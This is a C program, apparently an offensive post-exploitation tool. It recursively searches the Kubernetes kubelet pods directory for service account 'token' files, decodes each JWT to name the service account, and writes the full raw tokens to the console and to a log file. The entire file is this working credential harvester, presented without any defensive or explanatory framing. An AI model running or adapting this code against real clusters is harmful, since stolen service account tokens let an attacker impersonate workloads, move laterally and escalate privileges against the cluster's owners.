#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/stat.h>
#include <unistd.h>
#include <ctype.h>
#include <stdarg.h>

FILE *log_file = NULL;
void log_printf(const char *format, ...);

char* base64_decode(const char* input, int* output_length) {
    static const char decode_table[256] = {
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,62,-1,-1,-1,63,
        52,53,54,55,56,57,58,59,60,61,-1,-1,-1,-2,-1,-1,
        -1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9,10,11,12,13,14,
        15,16,17,18,19,20,21,22,23,24,25,-1,-1,-1,-1,-1,
        -1,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,
        41,42,43,44,45,46,47,48,49,50,51,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,
        -1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1,-1
    };
    
    int input_len = strlen(input);
    int padding = 0;
    
    if (input_len > 0 && input[input_len - 1] == '=') {
        padding++;
        if (input_len > 1 && input[input_len - 2] == '=') {
            padding++;
        }
    }
    
    *output_length = (input_len * 3) / 4 - padding;
    char* output = malloc(*output_length + 1);
    
    int i, j;
    for (i = 0, j = 0; i < input_len; i += 4, j += 3) {
        char a = (i < input_len) ? decode_table[(unsigned char)input[i]] : 0;
        char b = (i + 1 < input_len) ? decode_table[(unsigned char)input[i + 1]] : 0;
        char c = (i + 2 < input_len) ? decode_table[(unsigned char)input[i + 2]] : 0;
        char d = (i + 3 < input_len) ? decode_table[(unsigned char)input[i + 3]] : 0;
        
        if (a == -1 || b == -1 || (c == -1 && input[i + 2] != '=') || (d == -1 && input[i + 3] != '=')) {
            free(output);
            return NULL;
        }
        
        if (j < *output_length) output[j] = (a << 2) | (b >> 4);
        if (j + 1 < *output_length) output[j + 1] = (b << 4) | (c >> 2);
        if (j + 2 < *output_length) output[j + 2] = (c << 6) | d;
    }
    
    output[*output_length] = '\0';
    return output;
}

char* extract_serviceaccount_name(const char* json) {
    char* kubernetes_start = strstr(json, "\"kubernetes.io\"");
    if (!kubernetes_start) return NULL;
    
    char* serviceaccount_start = strstr(kubernetes_start, "\"serviceaccount\"");
    if (!serviceaccount_start) return NULL;
    
    char* name_start = strstr(serviceaccount_start, "\"name\"");
    if (!name_start) return NULL;
    
    char* colon = strchr(name_start + 6, ':');
    if (!colon) return NULL;
    
    char* quote1 = strchr(colon, '"');
    if (!quote1) return NULL;
    
    char* quote2 = strchr(quote1 + 1, '"');
    if (!quote2) return NULL;
    
    int name_len = quote2 - quote1 - 1;
    char* name = malloc(name_len + 1);
    strncpy(name, quote1 + 1, name_len);
    name[name_len] = '\0';
    
    return name;
}

void decode_jwt_and_extract_name(const char* jwt_token, const char* filepath) {
    char* token_copy = strdup(jwt_token);
    char* saveptr;
    strtok_r(token_copy, ".", &saveptr);  // Skip header
    char* payload = strtok_r(NULL, ".", &saveptr);
    
    if (!payload) {
        log_printf("[-] Invalid JWT format\n");
        free(token_copy);
        return;
    }
    
    int payload_len = strlen(payload);
    int padding_needed = (4 - (payload_len % 4)) % 4;
    char* padded_payload = malloc(payload_len + padding_needed + 1);
    strcpy(padded_payload, payload);
    for (int i = 0; i < padding_needed; i++) {
        strcat(padded_payload, "=");
    }
    
    int decoded_len;
    char* decoded_payload = base64_decode(padded_payload, &decoded_len);
    
    if (decoded_payload) {
        char* name = extract_serviceaccount_name(decoded_payload);
        if (name) {
            log_printf("[+] serviceaccount: %s\n", name);
            log_printf("[+] content:\n%s\n", jwt_token);
            free(name);
        } else {
            log_printf("[-] ServiceAccount name not found in JWT\n");
        }
        free(decoded_payload);
    } else {
        log_printf("[-] Failed to decode JWT payload\n");
    }
    
    free(padded_payload);
    free(token_copy);
}

void read_and_process_token(const char *filepath) {
    FILE *file = fopen(filepath, "r");
    if (file == NULL) {
        log_printf("Error: Cannot open file %s\n", filepath);
        return;
    }
    
    char buffer[4096];
    size_t total_len = 0;
    char* token = malloc(4096);
    token[0] = '\0';
    
    while (fgets(buffer, sizeof(buffer), file) != NULL) {
        size_t len = strlen(buffer);
        if (buffer[len - 1] == '\n') {
            buffer[len - 1] = '\0';
            len--;
        }
        
        if (total_len + len >= 4095) {
            token = realloc(token, total_len + len + 1024);
        }
        
        strcat(token, buffer);
        total_len += len;
    }
    
    if (strlen(token) > 0) {
        decode_jwt_and_extract_name(token, filepath);
    }
    
    free(token);
    fclose(file);
}

void traverse_directory(const char *basepath) {
    DIR *dir;
    struct dirent *entry;
    struct stat statbuf;
    char path[1024];
    
    if (!(dir = opendir(basepath))) {
        log_printf("Cannot open directory: %s\n", basepath);
        return;
    }
    
    while ((entry = readdir(dir)) != NULL) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) {
            continue;
        }
        
        snprintf(path, sizeof(path), "%s/%s", basepath, entry->d_name);
        
        if (lstat(path, &statbuf) == -1) {
            continue;
        }
        
        if (S_ISDIR(statbuf.st_mode)) {
            traverse_directory(path);
        } else if (S_ISREG(statbuf.st_mode) && strcmp(entry->d_name, "token") == 0) {
            read_and_process_token(path);
        }
    }
    
    closedir(dir);
}

void log_printf(const char *format, ...) {
    va_list args;
    va_start(args, format);
    
    vprintf(format, args);
    
    if (log_file) {
        va_start(args, format);
        vfprintf(log_file, format, args);
        fflush(log_file);
    }
    
    va_end(args);
}

int main(int argc, char *argv[]) {
    const char *kubelet_pods_path = "/var/lib/kubelet/pods";
    
    char *xsapath = getenv("XSAPATH");
    if (xsapath) {
        kubelet_pods_path = xsapath;
    } else if (argc > 1) {
        kubelet_pods_path = argv[1];
    }
    
    char *xsalog = getenv("XSALOG");
    if (!xsalog) {
        xsalog = "x.log";
    }
    
    log_file = fopen(xsalog, "a");
    if (!log_file) {
        printf("Error: Cannot open log file %s\n", xsalog);
        return 1;
    }
    
    log_printf("[?] searching for 'token' files in %s\n", kubelet_pods_path);
    
    struct stat st;
    if (stat(kubelet_pods_path, &st) != 0) {
        log_printf("Error: Directory %s does not exist or cannot be accessed\n", kubelet_pods_path);
        if (log_file) fclose(log_file);
        return 1;
    }
    
    if (!S_ISDIR(st.st_mode)) {
        log_printf("Error: %s is not a directory\n", kubelet_pods_path);
        if (log_file) fclose(log_file);
        return 1;
    }
    
    traverse_directory(kubelet_pods_path);
    
    log_printf("[+] done\n");
    
    if (log_file) {
        fclose(log_file);
    }
    
    return 0;
}